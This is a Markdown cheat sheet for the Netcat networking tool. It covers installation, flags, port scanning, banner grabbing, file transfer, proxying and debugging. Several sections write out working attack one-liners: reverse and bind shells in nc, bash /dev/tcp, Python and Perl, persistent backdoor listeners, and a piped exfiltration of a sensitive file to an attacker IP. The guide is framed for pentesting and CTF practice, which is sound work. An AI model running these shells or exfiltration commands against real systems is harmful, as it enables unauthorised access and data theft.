# Netcat (nc)

## Overview
Netcat (nc) is a versatile networking utility for reading from and writing to network connections using TCP or UDP. Often called the "Swiss Army knife" of networking, it's used for port scanning, file transfers, backdoors, port forwarding, and debugging network services.

## Installation

```bash
# Debian/Ubuntu (traditional netcat)
sudo apt install netcat-traditional

# Debian/Ubuntu (OpenBSD version)
sudo apt install netcat-openbsd

# RHEL/CentOS
sudo yum install nc

# macOS (usually pre-installed)
brew install netcat

# Ncat (Nmap's netcat)
sudo apt install ncat
```

## Basic Usage

```bash
# Connect to a host
nc <host> <port>

# Listen on a port
nc -l -p <port>

# Send file
nc <host> <port> < file.txt

# Receive file
nc -l -p <port> > received.txt
```

## Common Options

| Option | Description |
|--------|-------------|
| `-l` | Listen mode |
| `-p PORT` | Specify port |
| `-u` | UDP mode (default is TCP) |
| `-v` | Verbose output |
| `-vv` | Very verbose |
| `-n` | No DNS resolution |
| `-z` | Zero-I/O mode (scanning) |
| `-w SECS` | Timeout for connects |
| `-e CMD` | Execute command (not available in all versions) |
| `-c CMD` | Execute command via /bin/sh |
| `-k` | Keep listening after disconnect |
| `-q SECS` | Quit after SECS seconds |

## Examples

### Port Scanning
```bash
# Scan single port
nc -zv example.com 80

# Scan port range
nc -zv example.com 20-25

# Scan multiple ports
nc -zv example.com 80 443 8080

# Quick scan without DNS
nc -zvn 192.168.1.1 1-1000

# UDP port scan
nc -zvu example.com 53
```

### Banner Grabbing
```bash
# HTTP banner
echo "HEAD / HTTP/1.0\r\n\r\n" | nc example.com 80

# SMTP banner
nc -v example.com 25

# SSH banner
nc -v example.com 22

# FTP banner
nc -v example.com 21
```

### Simple Chat
```bash
# Server side
nc -l -p 4444

# Client side
nc <server_ip> 4444

# Type messages on either side
```

### File Transfer
```bash
# Receiver (listen first)
nc -l -p 4444 > received_file.txt

# Sender
nc <receiver_ip> 4444 < file.txt

# Transfer with progress (using pv)
nc -l -p 4444 | pv > received_file.txt
cat file.txt | pv | nc <receiver_ip> 4444
```

### Directory Transfer
```bash
# Send entire directory
tar czf - /path/to/dir | nc <receiver_ip> 4444

# Receive directory
nc -l -p 4444 | tar xzf -
```

### Remote Shell (Reverse Shell)
```bash
# Victim/Target (connects back)
nc <attacker_ip> 4444 -e /bin/bash

# OpenBSD version
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f

# Attacker (listener)
nc -l -p 4444
```

### Bind Shell
```bash
# Victim/Target (listens)
nc -l -p 4444 -e /bin/bash

# Attacker (connects)
nc <target_ip> 4444
```

### Port Forwarding
```bash
# Forward local port to remote
mkfifo backpipe
nc -l -p 8080 0<backpipe | nc example.com 80 1>backpipe

# Simple relay
nc -l -p 4444 | nc remote_host 80
```

### Web Server Testing
```bash
# HTTP GET request
printf "GET / HTTP/1.0\r\n\r\n" | nc example.com 80

# HTTP POST request
printf "POST /api HTTP/1.0\r\nContent-Length: 5\r\n\r\nhello" | nc example.com 80

# Test HTTPS (with OpenSSL)
echo "GET / HTTP/1.0" | openssl s_client -connect example.com:443
```

### Backdoor Listener
```bash
# Persistent listener (keeps accepting connections)
while true; do nc -l -p 4444 -e /bin/bash; done

# With ncat (built-in keep-alive)
ncat -l -p 4444 -k -c /bin/bash
```

### UDP Communication
```bash
# UDP listener
nc -u -l -p 53

# UDP client
nc -u example.com 53

# Test DNS
echo "test" | nc -u 8.8.8.8 53
```

### Proxying
```bash
# Simple proxy (pipe between two connections)
mkfifo pipe
nc -l -p 8080 < pipe | nc target.com 80 > pipe

# Transparent proxy with logging
nc -l -p 8080 | tee to_server.log | nc target.com 80 | tee from_server.log
```

### Network Debugging
```bash
# Test if port is open
nc -zv example.com 443

# Check connection with timeout
nc -w 5 example.com 80

# Monitor traffic
nc -l -p 4444 | xxd

# Send hex data
echo -ne '\x00\x01\x02\x03' | nc example.com 1234
```

### Remote Command Execution
```bash
# Execute command and return output
echo "ls -la" | nc <target_ip> 4444

# Interactive shell
nc <target_ip> 4444
```

## Advanced Techniques

### Encrypted Communication
```bash
# Using OpenSSL for encryption
# Server
nc -l -p 4444 | openssl enc -d -aes256 > file.txt

# Client
cat file.txt | openssl enc -aes256 | nc <server_ip> 4444
```

### Stealth Scanning
```bash
# No DNS, short timeout
nc -znvw 1 192.168.1.1 1-1000 2>&1 | grep succeeded

# Scan with delays
for port in {1..1000}; do
  nc -zv -w 1 192.168.1.1 $port 2>&1 | grep succeeded
  sleep 0.1
done
```

### Data Exfiltration
```bash
# Exfiltrate data over HTTP-like traffic
nc -l -p 80 > exfil.data

# Send data
cat sensitive.txt | nc <attacker_ip> 80
```

### Honeypot/Logging
```bash
# Log all connections
while true; do
  nc -l -p 4444 | tee -a connection.log
done

# With timestamp
while true; do
  echo "=== $(date) ===" >> connection.log
  nc -l -p 4444 | tee -a connection.log
done
```

### Reverse Shell Techniques

#### Bash Reverse Shell
```bash
# Method 1: Using /dev/tcp
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Method 2: Using netcat
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f

# Method 3: With telnet
mknod /tmp/backpipe p; /bin/bash 0</tmp/backpipe | nc 10.0.0.1 4444 1>/tmp/backpipe
```

#### Python Reverse Shell
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

#### Perl Reverse Shell
```bash
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

### Stabilizing Shells
```bash
# Once you have a shell, stabilize it:

# Method 1: Python PTY
python -c 'import pty; pty.spawn("/bin/bash")'
# Then Ctrl+Z, type: stty raw -echo; fg
# Then: export TERM=xterm

# Method 2: Script command
script /dev/null -c bash

# Method 3: Socat (if available)
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

## Ncat (Nmap's Netcat)

Ncat is a modern reimplementation with additional features:

```bash
# SSL/TLS support
ncat --ssl -l -p 4444

# Access control
ncat -l -p 4444 --allow 192.168.1.0/24

# Broker mode (connect multiple clients)
ncat -l -p 4444 --broker

# Execute commands
ncat -l -p 4444 --exec /bin/bash

# Proxy chains
ncat --proxy proxy.example.com:8080 --proxy-type http target.com 80

# Rate limiting
ncat -l -p 4444 --max-conns 10
```

## Security Considerations

### Defensive Use
```bash
# Monitor suspicious connections
nc -l -p 4444 -v | logger -t "netcat-monitor"

# Check for open ports on your system
nc -zv localhost 1-65535 2>&1 | grep succeeded
```

### Testing Security
```bash
# Test firewall rules
nc -zv external_ip 1-1000

# Verify port filtering
nc -u -zv external_ip 1-1000
```

## Common Use Cases

### Penetration Testing
- Port scanning
- Banner grabbing
- Reverse/bind shells
- Data exfiltration
- Pivoting

### System Administration
- Network troubleshooting
- Testing connectivity
- File transfers
- Quick HTTP testing
- Service debugging

### CTF/HackTheBox
- Connect to services
- Receive reverse shells
- Transfer tools
- Port forwarding
- Exploit delivery

## Troubleshooting

### Connection Issues
```bash
# Increase verbosity
nc -vv example.com 80

# Check with timeout
nc -w 5 -v example.com 80

# Try UDP instead
nc -u -v example.com 53
```

### Firewall Testing
```bash
# Test both TCP and UDP
nc -zv target.com 80
nc -zuv target.com 53

# Test from different source port
nc -p 443 target.com 80
```

### Shell Not Working
```bash
# Try different shell paths
nc -e /bin/sh attacker_ip 4444
nc -e /bin/bash attacker_ip 4444
nc -e cmd.exe attacker_ip 4444  # Windows

# Use named pipe method
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker_ip 4444 > /tmp/f
```

## Netcat Variants

| Variant | Features | Use Case |
|---------|----------|----------|
| **Traditional nc** | Basic features | Simple tasks |
| **OpenBSD nc** | Cleaner, no -e flag | Secure environments |
| **Ncat** | SSL, access control, broker | Modern usage |
| **Socat** | Advanced, bidirectional | Complex scenarios |
| **Cryptcat** | Encrypted traffic | Secure transfers |

## One-Liners

```bash
# Quick HTTP server
while true; do echo -e "HTTP/1.1 200 OK\n\n$(date)" | nc -l -p 8080; done

# Quick file server
while true; do nc -l -p 8080 < file.txt; done

# Port knock
nc -z target.com 1111; nc -z target.com 2222; nc target.com 3333

# Backup over network
tar czf - /data | nc backup_server 4444

# Remote command via UDP
echo "command" | nc -u target.com 53

# Check multiple hosts
for host in host1 host2 host3; do nc -zv $host 80; done
```

## Tips & Tricks

1. **Always use -v** - Verbose output helps debugging
2. **Use -n for speed** - Skip DNS resolution when IP is known
3. **Combine with other tools** - Pipe with grep, awk, etc.
4. **Use ncat for SSL** - More secure than traditional nc
5. **Test locally first** - Verify commands work before using remotely
6. **Know your version** - Different versions have different flags
7. **Use timeouts** - Prevent hanging connections with -w
8. **Keep listeners persistent** - Use while loops or -k flag
9. **Log everything** - Use tee for important operations
10. **Practice in labs** - Test shells and transfers in safe environment

## Alternatives

- **Socat**: More powerful, complex syntax
- **Ncat**: Modern, feature-rich
- **Telnet**: Similar for basic connections
- **Cryptcat**: Encrypted netcat
- **Powercat**: PowerShell implementation

## References

- **Man Page**: `man nc`
- **Ncat Guide**: https://nmap.org/ncat/guide/
- **Reverse Shell Cheat Sheet**: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- **GTFOBins Netcat**: https://gtfobins.github.io/gtfobins/nc/
